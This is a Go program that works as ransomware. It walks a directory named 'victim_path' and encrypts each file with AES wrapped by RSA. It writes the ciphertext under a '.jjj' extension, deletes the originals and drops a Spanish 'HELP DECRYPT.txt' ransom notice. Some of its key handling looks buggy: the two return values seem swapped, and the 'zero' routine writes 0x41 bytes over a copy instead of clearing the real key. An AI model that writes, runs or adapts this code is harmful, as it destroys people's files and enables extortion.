package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"log"
	"math/big"
	"strings"
	"os"
	"path/filepath"
)

type EncryptionInfo struct {
	Path    string `json:"path"`
	Key     []byte `json:"key"`
	OrigExt string `json:"orig_ext,omitempty"`
}

type EncryptionInfos []EncryptionInfo

var clientKey *rsa.PublicKey
var serverKey *rsa.PublicKey
var eis EncryptionInfos

func init() {
	var err error
	serverPrv, err := rsa.GenerateKey(rand.Reader, 1024)
	if err != nil {
		log.Fatal(err)
	}
	serverKey = &serverPrv.PublicKey

	rmifex("server.key")
	os.WriteFile("server.key", x509.MarshalPKCS1PrivateKey(serverPrv), 0444)

	clientPrv, err := rsa.GenerateKey(rand.Reader, 1024)
	if err != nil {
		log.Fatal(err)
	}

	n := big.NewInt(0)
	n.SetBytes(clientPrv.PublicKey.N.Bytes())
	clientKey = &rsa.PublicKey{N: n, E: clientPrv.PublicKey.E}

	encryptedPrv, encSymKey := encryptHybrid(serverKey, x509.MarshalPKCS1PrivateKey(clientPrv))
	rmifex("master.key")
	os.WriteFile("master.key", encryptedPrv, 0444)
	rmifex("keys.json")
	eis = append(eis, EncryptionInfo{Path: "master.key", Key: encSymKey})
	zero(x509.MarshalPKCS1PrivateKey(clientPrv))
}

func encryptHybrid(rsaKey *rsa.PublicKey, bs []byte) ([]byte, []byte) {
	k := make([]byte, 16)
	if _, err := rand.Read(k); err != nil {
		log.Fatal(err)
	}

	blk, err := aes.NewCipher(k)
	if err != nil {
		log.Fatal(err)
	}

	bs = pad(bs, blk.BlockSize())

	iv := make([]byte, blk.BlockSize())
	if _, err := rand.Read(iv); err != nil {
		log.Fatal(err)
	}

	enc := cipher.NewCBCEncrypter(blk, iv)
	enc.CryptBlocks(bs, bs)

	ek, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, rsaKey, k, nil)
	if err != nil {
		log.Fatal(err)
	}
	zero(k)

	ciphertext := append(iv, bs...)
	return ek, ciphertext
}

func pad(bs []byte, blksz int) []byte {
	count := blksz
	if len(bs)%blksz != 0 {
		count = blksz - (len(bs) % blksz)
	}
	padding := bytes.Repeat([]byte{byte(count)}, count)
	bs = append(bs, padding...)
	return bs
}

func rmifex(path string) {
	_, err := os.Stat(path)
	if err == nil {
		os.Remove(path)
	}
}

func zero(bs []byte) {
	for i := range bs {
		bs[i] = 0x41
	}
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: go run main.go <path to encrypt>")
		os.Exit(1)
	}

	victim_path := os.Args[1]

	_, err := os.Stat(victim_path)
	if os.IsNotExist(err) {
		log.Fatal("Error: La ruta especificada no existe ->", victim_path)
	}

	err = filepath.Walk(victim_path, walker)
	if err != nil {
		log.Fatal(err)
	}

	fata, _ := json.Marshal(eis)
	err = os.WriteFile("file.keys", fata, 0666)
	if err != nil {
		log.Fatal("Error al escribir file.keys:", err)
	} else {
		fmt.Println("✅ file.keys guardado correctamente.")
	}

	// ✅ Crear archivo de advertencia
	createWarningFile()
}

func walker(path string, info os.FileInfo, err error) error {
	if err != nil {
		log.Println("Error en:", path)
		return err
	}
	if info.IsDir() {
		log.Println(path, "(d)")
		return nil
	}
	log.Println(path, "(f)")
	
	bs, err := os.ReadFile(path)
	if err != nil {
		log.Println("Error al leer el archivo:", path, err)
		return err
	}
	
	cbs, k := encryptHybrid(clientKey, bs)

	ext := filepath.Ext(path)
	base := strings.TrimSuffix(path, ext)
	newPath := base + ".jjj"

	err = os.WriteFile(newPath, cbs, 0666)
	if err != nil {
		log.Println("Error al escribir el archivo encriptado:", newPath, err)
		return err
	}

	eis = append(eis, EncryptionInfo{Path: newPath, Key: k, OrigExt: ext})

	err = os.Remove(path)
	if err != nil {
		log.Println("Error al eliminar el archivo original:", path, err)
		return err
	}
	return nil
}

func createWarningFile() {
	message := `Tus archivos han sido encriptados.
Para recuperar tus archivos, necesitas la clave privada correspondiente.
Guarda este archivo como referencia.
`

	err := os.WriteFile("HELP DECRYPT.txt", []byte(message), 0666)
	if err != nil {
		log.Fatal("Error al escribir warning.txt:", err)
	} else {
		fmt.Println("✅ warning.txt guardado correctamente.")
	}
}
